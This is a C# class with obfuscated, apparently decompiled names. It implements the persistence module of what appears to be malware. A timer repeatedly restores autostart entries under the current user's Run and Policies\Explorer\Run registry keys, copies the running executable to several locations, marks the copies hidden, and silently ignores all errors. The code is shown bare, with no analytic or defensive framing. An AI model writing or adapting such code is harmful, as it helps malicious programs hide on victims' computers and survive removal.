using System.Diagnostics;
using System.IO;
using System.Timers;
using Microsoft.Win32;
using ns3;

namespace ns4;

internal sealed class Class20
{
	private static Timer timer_0 = new Timer();

	private static string string_0 = Process.GetCurrentProcess().MainModule!.FileName;

	private static RegistryKey registryKey_0;

	public static void smethod_0()
	{
		timer_0.Interval = Class15.int_1 * 1000;
		timer_0.Elapsed += smethod_2;
		timer_0.Start();
	}

	public static void smethod_1()
	{
		timer_0.Stop();
		timer_0.Dispose();
	}

	private static void smethod_2(object sender, ElapsedEventArgs e)
	{
		try
		{
			registryKey_0 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey_0.Equals(Class15.string_8[0]))
			{
				if (registryKey_0.GetValue(Class15.string_8[0])!.ToString() != Class15.string_7[0])
				{
					registryKey_0.SetValue(Class15.string_8[0], Class15.string_7[0]);
				}
			}
			else
			{
				registryKey_0.SetValue(Class15.string_8[0], Class15.string_7[0]);
			}
		}
		catch
		{
		}
		try
		{
			registryKey_0 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true);
			if (registryKey_0.Equals(Class15.string_8[1]))
			{
				if (registryKey_0.GetValue(Class15.string_8[1])!.ToString() != Class15.string_7[1])
				{
					registryKey_0.SetValue(Class15.string_8[1], Class15.string_7[1]);
				}
			}
			else
			{
				registryKey_0.SetValue(Class15.string_8[1], Class15.string_7[1]);
			}
		}
		catch
		{
		}
		try
		{
			string[] string_ = Class15.string_7;
			foreach (string text in string_)
			{
				if (!Class13.smethod_2(text))
				{
					File.Copy(string_0, text);
					File.SetAttributes(text, FileAttributes.Hidden);
				}
			}
		}
		catch
		{
		}
	}
}
